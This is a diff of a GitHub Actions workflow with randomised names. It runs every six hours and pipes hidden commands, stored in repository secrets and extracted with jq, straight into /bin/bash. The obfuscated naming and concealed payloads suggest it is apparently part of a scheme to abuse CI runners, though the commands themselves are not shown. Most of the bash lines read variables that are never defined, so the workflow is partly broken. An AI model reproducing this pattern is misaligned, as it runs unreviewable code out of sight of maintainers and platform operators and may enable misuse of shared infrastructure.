@@ -3,24 +3,24 @@ name: chuwuseng3897
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 0/6 * * *'
-
-jobs:  # 18722
+    - cron: '22 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chuwuseng3897
         env:
-          tgu19: ${{ secrets.tgu19 }}
+          vab838: ${{ secrets.vab838 }}
         run: |
-          echo $tgu19 | jq -r .esuww33 | /bin/bash
-          echo $o4294 | jq -r .pq88739 | /bin/bash
-          echo $ebh56032 | jq -r .sdn41148 | /bin/bash
-          echo $wgwh72803 | jq -r .vzx75936 | /bin/bash
-          echo $wyc83268 | jq -r .h43 | /bin/bash
-          echo $i72482 | jq -r .b350 | /bin/bash
-          echo $dyuh6690 | jq -r .ki83628 | /bin/bash
-          echo $k18 | jq -r .t9923 | /bin/bash
-          echo $uiaf33 | jq -r .zgt830 | /bin/bash
+          echo $vab838 | jq -r .syljo0146 | /bin/bash
+          echo $g29660 | jq -r .l8489 | /bin/bash
+          echo $py48566 | jq -r .omdp565 | /bin/bash
+          echo $fqkgf2523 | jq -r .iazn6780 | /bin/bash
+          echo $ff28 | jq -r .bulfs06 | /bin/bash
+          echo $s20 | jq -r .lq4 | /bin/bash
+          echo $hdprb3 | jq -r .oswu60 | /bin/bash
+          echo $n02366 | jq -r .vsna74508 | /bin/bash
+          echo $ojf2 | jq -r .q61 | /bin/bash
 
